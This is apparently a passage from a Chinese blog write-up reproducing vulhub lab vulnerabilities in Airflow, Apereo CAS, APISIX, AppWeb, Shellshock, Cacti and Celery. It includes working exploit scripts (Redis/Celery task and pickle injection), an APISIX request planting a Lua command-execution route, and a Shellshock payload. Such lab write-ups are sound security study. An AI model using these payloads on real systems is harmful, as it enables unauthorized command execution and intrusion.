class="hljs-number">0</span>) <br>queue_name = <span class="hljs-string">&#x27;default&#x27;</span><br>ori_str=<span class="hljs-string">&quot;&#123;\&quot;content-encoding\&quot;: \&quot;utf-8\&quot;, \&quot;properties\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;delivery_tag\&quot;: \&quot;f29d2b4f-b9d6-4b9a-9ec3-029f9b46e066\&quot;, \&quot;delivery_mode\&quot;: 2, \&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;correlation_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;\&quot;&#125;, \&quot;reply_to\&quot;: \&quot;fb996eec-3033-3c10-9ee1-418e1ca06db8\&quot;&#125;, \&quot;content-type\&quot;: \&quot;application/json\&quot;, \&quot;headers\&quot;: &#123;\&quot;retries\&quot;: 0, \&quot;lang\&quot;: \&quot;py\&quot;, \&quot;argsrepr\&quot;: \&quot;(100, 200)\&quot;, \&quot;expires\&quot;: null, \&quot;task\&quot;: \&quot;airflow.executors.celery_executor.execute_command\&quot;, \&quot;kwargsrepr\&quot;: \&quot;&#123;&#125;\&quot;, \&quot;root_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;parent_id\&quot;: null, \&quot;id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;origin\&quot;: \&quot;gen1@132f65270cde\&quot;, \&quot;eta\&quot;: null, \&quot;group\&quot;: null, \&quot;timelimit\&quot;: [null, null]&#125;, \&quot;body\&quot;: \&quot;W1sxMDAsIDIwMF0sIHt9LCB7ImNoYWluIjogbnVsbCwgImNob3JkIjogbnVsbCwgImVycmJhY2tzIjogbnVsbCwgImNhbGxiYWNrcyI6IG51bGx9XQ==\&quot;&#125;&quot;</span><br>task_dict = json.loads(ori_str)<br>command = [<span class="hljs-string">&#x27;touch&#x27;</span>, <span class="hljs-string">&#x27;/tmp/airflow_celery_success&#x27;</span>]<br>body=[[command], &#123;&#125;, &#123;<span class="hljs-string">&quot;chain&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;chord&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;errbacks&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;callbacks&quot;</span>: <span class="hljs-literal">None</span>&#125;]<br>task_dict[<span class="hljs-string">&#x27;body&#x27;</span>]=base64.b64encode(json.dumps(body).encode()).decode()<br><span class="hljs-built_in">print</span>(task_dict)<br>r.lpush(queue_name,json.dumps(task_dict))<br><br></code></pre></td></tr></table></figure><p>base64</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;touch&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/tmp/airflow_celery_success&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;chain&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;chord&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;errbacks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;callbacks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><h3 id="CVE-2020-17526"><a href="#CVE-2020-17526" class="headerlink" title="CVE-2020-17526"></a>CVE-2020-17526</h3><p>Apache Airflow是一款开源的，分布式任务调度框架。默认情况下，Apache Airflow无需用户认证，但管理员也可以通过指定<code>webserver.authenticate=True</code>来开启认证。</p><p>在其1.10.13版本及以前，即使开启了认证，攻击者也可以通过一个默认密钥来绕过登录，伪造任意用户。</p><p>获取初始session</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -v http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/admin/</span>airflow/login<br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824185850862.png" class="" title="image-20220824185850862"><p>利用<a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a>解密私钥</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824185934521.png" class="" title="image-20220824185934521"><p>利用解出的私钥伪造session</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824190007905.png" class="" title="image-20220824190007905"><p>修改session,进入页面</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824190035956.png" class="" title="image-20220824190035956"><h2 id="Apereo-CAS-4-1-反序列化命令执行漏洞"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞"></a>Apereo CAS 4.1 反序列化命令执行漏洞</h2><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> EncryptedTranscoder implements Transcoder &#123;<br>    <span class="hljs-keyword">private</span> CipherBean cipherBean;<br>    <span class="hljs-keyword">private</span> boolean compression = <span class="hljs-literal">true</span>;<br><br>    public <span class="hljs-constructor">EncryptedTranscoder()</span> throws IOException &#123;<br>        BufferedBlockCipherBean bufferedBlockCipherBean = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BufferedBlockCipherBean()</span>;<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">BlockCipherSpec(<span class="hljs-params">new</span> BufferedBlockCipherSpec(<span class="hljs-string">&quot;AES&quot;</span>, <span class="hljs-string">&quot;CBC&quot;</span>, <span class="hljs-string">&quot;PKCS7&quot;</span>)</span>);<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">KeyStore(<span class="hljs-params">this</span>.<span class="hljs-params">createAndPrepareKeyStore</span>()</span>);<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">KeyAlias(<span class="hljs-string">&quot;aes128&quot;</span>)</span>;<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">KeyPassword(<span class="hljs-string">&quot;changeit&quot;</span>)</span>;<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">Nonce(<span class="hljs-params">new</span> RBGNonce()</span>);<br>        this.set<span class="hljs-constructor">CipherBean(<span class="hljs-params">bufferedBlockCipherBean</span>)</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>随便输入账号密码点击login</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223009720.png" class="" title="image-20220824223009720"><p>burp抓包</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223042288.png" class="" title="image-20220824223042288"><p>execution部分经工具<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>。使用ysoserial的CommonsCollections4生成加密后的Payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar apereo-cas-attack-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar CommonsCollections4 <span class="hljs-string">&quot;此处可反弹shell&quot;</span><br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223258998.png" class="" title="image-20220824223258998"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223328390.png" class="" title="image-20220824223328390"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223411190.png" class="" title="image-20220824223411190"><h2 id="apisix"><a href="#apisix" class="headerlink" title="apisix"></a>apisix</h2><h3 id="Apache-APISIX-默认密钥漏洞（CVE-2020-13945）"><a href="#Apache-APISIX-默认密钥漏洞（CVE-2020-13945）" class="headerlink" title="Apache APISIX 默认密钥漏洞（CVE-2020-13945）"></a>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apisix/admin/routes</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">X-API-KEY</span><span class="hljs-punctuation">: </span>edd1c9f034335f136f87ad84b625c8f1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>406<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;/attack&quot;</span>,</span><br><span class="language-swift"><span class="hljs-string">&quot;script&quot;</span>: <span class="hljs-string">&quot;local _M = &#123;&#125; <span class="hljs-subst">\n</span> function _M.access(conf, ctx) <span class="hljs-subst">\n</span> local os = require(&#x27;os&#x27;)<span class="hljs-subst">\n</span> local args = assert(ngx.req.get_uri_args()) <span class="hljs-subst">\n</span> local f = assert(io.popen(args.cmd, &#x27;r&#x27;))<span class="hljs-subst">\n</span> local s = assert(f:read(&#x27;*a&#x27;))<span class="hljs-subst">\n</span> ngx.say(s)<span class="hljs-subst">\n</span> f:close()  <span class="hljs-subst">\n</span> end <span class="hljs-subst">\n</span>return _M&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;upstream&quot;</span>: &#123;</span><br><span class="language-swift">        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;roundrobin&quot;</span>,</span><br><span class="language-swift">        <span class="hljs-string">&quot;nodes&quot;</span>: &#123;</span><br><span class="language-swift">            <span class="hljs-string">&quot;example.com:80&quot;</span>: <span class="hljs-number">1</span></span><br><span class="language-swift">        &#125;</span><br><span class="language-swift">    &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220825002507937.png" class="" title="image-20220825002507937"><h2 id="appweb"><a href="#appweb" class="headerlink" title="appweb"></a>appweb</h2><h3 id="CVE-2018-8715"><a href="#CVE-2018-8715" class="headerlink" title="CVE-2018-8715"></a>CVE-2018-8715</h3><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C&#x2F;C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><p>逻辑漏洞</p><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220825113650439.png" class="" title="image-20220825113650439"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220825114054033.png" class="" title="image-20220825114054033"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220825114207682.png" class="" title="image-20220825114207682"><h2 id="Aria2-任意文件写入漏洞"><a href="#Aria2-任意文件写入漏洞" class="headerlink" title="Aria2 任意文件写入漏洞"></a>Aria2 任意文件写入漏洞</h2><p>Aria2是一款<a href="https://zh.m.wikipedia.org/wiki/%E8%87%AA%E7%94%B1%E8%BD%AF%E4%BB%B6">自由</a>、<a href="https://zh.m.wikipedia.org/wiki/%E8%B7%A8%E5%B9%B3%E5%8F%B0">跨平台</a><a href="https://zh.m.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%95%8C%E9%9D%A2">命令行界面</a>的<a href="https://zh.m.wikipedia.org/wiki/%E4%B8%8B%E8%BD%BD%E7%AE%A1%E7%90%86%E5%99%A8">下载管理器</a>，该软件根据<a href="https://zh.m.wikipedia.org/wiki/GPLv2">GPLv2</a><a href="https://zh.m.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E8%AE%B8%E5%8F%AF%E8%AF%81">许可证</a>进行分发。支持的下载协议有：<a href="https://zh.m.wikipedia.org/wiki/HTTP">HTTP</a>、<a href="https://zh.m.wikipedia.org/wiki/HTTPS">HTTPS</a>、<a href="https://zh.m.wikipedia.org/wiki/FTP">FTP</a>、<a href="https://zh.m.wikipedia.org/wiki/BitTorrent_(%E5%8D%8F%E8%AE%AE)">Bittorrent</a>和<a href="https://zh.m.wikipedia.org/w/index.php?title=Metalink&action=edit&redlink=1">Metalink</a></p><p>复现出现了问题</p><h2 id="Bash-Shellshock-破壳漏洞（CVE-2014-6271）"><a href="#Bash-Shellshock-破壳漏洞（CVE-2014-6271）" class="headerlink" title="Bash Shellshock 破壳漏洞（CVE-2014-6271）"></a>Bash Shellshock 破壳漏洞（CVE-2014-6271）</h2><p><a href="https://www.antiy.com/response/CVE-2014-6271.html">https://www.antiy.com/response/CVE-2014-6271.html</a></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>该Bash使用的环境变量是通过函数名称来调用的，导致漏洞是以<code>()&#123;</code>开头定义的环境变量在命令env中解析成函数后，bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p><p>victim.cgi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/local/bash-4.3.0/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/html&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hello world&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><p>safe.cgi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/html&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hello world&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">User-<span class="hljs-built_in">Agent</span>: () &#123; foo; &#125;; <span class="hljs-built_in">echo</span> Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">text</span>/plain; <span class="hljs-built_in">echo</span>; /usr/bin/id<br></code></pre></td></tr></table></figure><p>尝试后发现内部服务器错误</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103205557054.png" class="" title="image-20230103205557054"><p>读取日志文件后发现是权限问题</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103205921329.png" class="" title="image-20230103205921329"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x victim.cgi safe.cgi<br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103210129914.png" class="" title="image-20230103210129914"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103210152725.png" class="" title="image-20230103210152725"><p>成功命令执行</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>上述权限问题可参照<a href="https://blog.csdn.net/Castlehe/article/details/124704393">https://blog.csdn.net/Castlehe/article/details/124704393</a> ，这下知道了Aria2无法复现可能就是权限问题</p><h2 id="Cacti-前台命令注入漏洞（CVE-2022-46169）"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul><li><a href="https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf">https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf</a></li><li><a href="https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A">https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A</a></li></ul><p>简而言之就是作者break 2破坏了优先性，导致可以通过X-Forwarded-For伪造内网地址通过验证，进而action&#x3D;polldata进入poll_for_data()</p><p>poll_for_data()函数会接收一个数组类型的local_data_ids参数和一个数字类型的参数host_id，并在poller_item表中进行查询。随后进行action的判断，如果action等于常量POLLER_ACTION_SCRIPT_PHP，即action&#x3D;2，则会执行命令。在Windows下，传入poller_id&#x3D;&amp; calc.exe即可拼接命令；在Linux下，传入poller_id&#x3D;; id即可拼接命令。</p><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>通过vulhub起一个Cacti 1.2.22的容器复现，最新版中修改break 2为break，没有这个漏洞了</p><p>这个漏洞的利用需要Cacti应用中至少存在一个类似是<code>POLLER_ACTION_SCRIPT_PHP</code>的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p><p>admin&#x2F;admin登陆</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234048850.png" class="" title="image-20230103234048850"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234138669.png" class="" title="image-20230103234138669"><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234451467.png" class="" title="image-20230103234451467"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker exec -it f9 <span class="hljs-regexp">/bin/</span>bash<br>ls -al <span class="hljs-regexp">/tmp/</span><br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234752107.png" class="" title="image-20230103234752107"><p>成功执行命令，由此也可以反弹shell等操作</p><h2 id="Celery-lt-4-0-Redis未授权访问-Pickle反序列化利用"><a href="#Celery-lt-4-0-Redis未授权访问-Pickle反序列化利用" class="headerlink" title="Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用"></a>Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</h2><p>Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p><p>在Celery &lt; 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-comment"># redis连接创建</span><br>r = redis.Redis(host=sys.argv[<span class="hljs-number">1</span>], port=<span class="hljs-number">6379</span>, decode_responses=<span class="hljs-literal">True</span>,db=<span class="hljs-number">0</span>) <br><span class="hljs-comment"># celery的任务传递格式</span><br>ori_str=<span class="hljs-string">&quot;&#123;\&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;delivery_tag\&quot;: \&quot;16f3f59d-003c-4ef4-b1ea-6fa92dee529a\&quot;, \&quot;reply_to\&quot;: \&quot;9edb8565-0b59-3389-944e-a0139180a048\&quot;, \&quot;delivery_mode\&quot;: 2, \&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;priority\&quot;: 0, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;correlation_id\&quot;: \&quot;6e046b48-bca4-49a0-bfa7-a92847216999\&quot;&#125;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;, \&quot;body\&quot;: \&quot;gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\&quot;&#125;&quot;</span><br>task_dict = json.loads(ori_str)<br>command = <span class="hljs-string">&#x27;touch /tmp/celery_success&#x27;</span><br><span class="hljs-comment"># 创建Person类，pickle反序列化时执行命令</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 未导入os模块，通用</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system, (command,))<br>pickleData = pickle.dumps(Person())<br>task_dict[<span class="hljs-string">&#x27;body&#x27;</span>]=base64.b64encode(pickleData).decode()<br><span class="hljs-built_in">print</span>(task_dict)<br>r.lpush(<span class="hljs-string">&#x27;celery&#x27;</span>,json.dumps(task_dict))<br></code></pre></td></tr></table></figure><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230104104448561.png" class="" title="image-20230104104448561"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230104104505481.png" class="" title="image-20230104104505481"><h2 id="CGI-HTTPoxy漏洞（CVE-2016-5385）"><a href="#CGI-HTTPoxy漏洞（CVE-2016-5385）" class="headerlink" title="CGI HTTPoxy漏洞（CVE-2016-5385）"></a>CGI HTTPoxy漏洞（CVE-2016-5385）</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul><li><p><a href="https://httpoxy.org/">https://httpoxy.org/</a></p></li><li><p><a href="https://www.laruence.com/2016/07/19/3101.html">https://www.laruence.com/2016/07/19/3101.html</a></p></li></ul><p><code>HTTP_PROXY</code> 环境变量会配置请求代理，而php会将网络请求Head中的请求头字段加上<code>HTTP_</code>这就导致<code>HTTP_PROXY</code>可控</p><h3 id="靶场-1"><a href="#靶场-1" class="headerlink" title="靶场"></a>靶场</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 